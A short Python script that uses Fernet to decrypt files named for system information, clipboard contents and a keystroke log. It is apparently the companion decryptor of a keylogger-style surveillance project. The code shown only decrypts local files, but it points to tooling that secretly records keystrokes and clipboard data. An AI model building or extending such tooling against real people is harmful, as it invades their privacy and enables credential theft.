from cryptography.fernet import Fernet

from dotenv import load_dotenv
load_dotenv()

import os

key = os.environ.get("ENCRYPTION_KEY")

#Encrypted file names
system_info_e = 'e_system_info.txt'
clipboard_info_e = 'e_clipboard.txt'
keys_info_e = 'e_keys_log.txt'

encrypted_files = [system_info_e, clipboard_info_e, keys_info_e]
cnt = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[cnt], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    cnt += 1